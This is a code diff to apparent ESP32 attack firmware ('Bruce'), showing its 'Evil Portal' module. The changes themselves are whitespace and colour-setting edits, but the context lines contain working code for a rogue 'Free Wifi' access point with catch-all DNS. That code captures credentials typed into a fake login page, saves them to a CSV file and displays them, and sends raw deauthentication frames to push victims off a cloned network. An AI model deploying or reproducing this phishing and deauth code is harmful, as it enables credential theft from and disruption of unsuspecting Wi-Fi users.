@@ -55,10 +55,10 @@ public:
       saveToCSV("/Bruce_creds.csv", csvLine);
       capturedCredentialsHtml = html_temp + capturedCredentialsHtml;
       totalCapturedCredentials++;
-      request->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet.")); 
-    } 
+      request->send(200, "text/html", getHtmlContents("Por favor, aguarde alguns minutos. Em breve você poderá acessar a internet."));
+    }
     else {
-      request->redirect("/"); 
+      request->redirect("/");
     }
   }
 };
@@ -74,12 +74,12 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     };
     delay(200);
     loopOptions(options);
-    
+
     while(checkNextPress()){ yield(); } // debounce
     delay(200);
     //  tssid="" means that are opening a virgin Evil Portal
-    if (tssid=="")  { 
-      AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:"); 
+    if (tssid=="")  {
+      AP_name = keyboard("Free Wifi", 30, "Evil Portal SSID:");
       }
     else { // tssid != "" means that is was cloned and can deploy Deauth
       //memcpy(ap_record.bssid, bssid, 6);
@@ -90,13 +90,13 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
 
     wifiConnected=true;
     drawMainBorder();
-    displayRedStripe("Starting..",TFT_WHITE,FGCOLOR);
+    displayRedStripe("Starting..",TFT_WHITE,bruceConfig.priColor);
 
     IPAddress AP_GATEWAY(172, 0, 0, 1);
     WiFi.mode(WIFI_MODE_AP);
     WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
     WiFi.softAP(AP_name,emptyString,channel);
-    
+
     tmp=millis();
     while(millis() - tmp < 3000) yield();
     dnsServer.start(53, "*", WiFi.softAPIP());
@@ -125,7 +125,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
       previousTotalCapturedCredentials=-1;  // redesenha a tela
     });
 
-    ep->on("/clear", HTTP_GET, [](AsyncWebServerRequest * request) { 
+    ep->on("/clear", HTTP_GET, [](AsyncWebServerRequest * request) {
       request->send(200, "text/html", clear_GET());
     });
 
@@ -148,8 +148,8 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     new (ep) AsyncWebServer(80);
 
     ep->begin();
-    tft.fillRect(6, 27, WIDTH-12, HEIGHT-33, BGCOLOR);
-    
+    tft.fillRect(6, 27, WIDTH-12, HEIGHT-33, bruceConfig.bgColor);
+
     bool hold_deauth = false;
     tmp=millis(); // one deauth frame each 30ms at least
     redraw=true;
@@ -160,7 +160,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         tft.setTextColor(TFT_RED);
         tft.drawCentreString("Evil Portal",WIDTH/2, 29, SMOOTH_FONT);
         tft.setCursor(7,49);
-        tft.setTextColor(FGCOLOR);
+        tft.setTextColor(bruceConfig.priColor);
         tft.println("AP: " + AP_name);
         tft.setCursor(7,tft.getCursorY());
         tft.println("->" + WiFi.softAPIP().toString() + "/creds");
@@ -177,7 +177,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         if (deauth){
           if (hold_deauth) {
             tft.setTextSize(FP);
-            tft.setTextColor(FGCOLOR);
+            tft.setTextColor(bruceConfig.priColor);
             tft.drawRightString("Deauth OFF", WIDTH-7,HEIGHT-14,SMOOTH_FONT);
           } else {
             tft.setTextSize(FP);
@@ -190,7 +190,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
         redraw=false;
       }
 
-      if(!hold_deauth && (millis()-tmp) >5)  { 
+      if(!hold_deauth && (millis()-tmp) >5)  {
         wsl_bypasser_send_raw_frame(deauth_frame, 26); // sends deauth frames if needed.
         tmp=millis();
       }
@@ -232,7 +232,7 @@ void saveToCSV(const String &filename, const String &csvLine) {
 }
 
 String getHtmlContents(String body) {
-  PROGMEM String html = 
+  PROGMEM String html =
     "<!DOCTYPE html>"
     "<html>"
     "<head>"
